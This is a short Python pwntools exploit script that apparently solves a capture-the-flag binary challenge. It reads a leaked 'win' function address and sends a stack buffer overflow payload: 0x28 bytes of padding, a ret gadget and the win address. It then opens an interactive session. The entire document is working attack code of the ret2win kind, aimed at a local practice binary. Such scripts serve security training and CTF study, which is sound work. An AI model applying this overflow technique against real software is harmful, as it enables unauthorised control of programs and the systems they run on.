from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

#read win addr
io.recvuntil(b'located at 0x')
win_addr = int(io.recv(6), 16)
log.info(f'win addr: {hex(win_addr)}')
ret_addr = 0x400626

payload = b'a' * 0x28
payload += p64(ret_addr)
payload += p64(win_addr)
io.sendlineafter(b'Input: ', payload)

io.interactive()

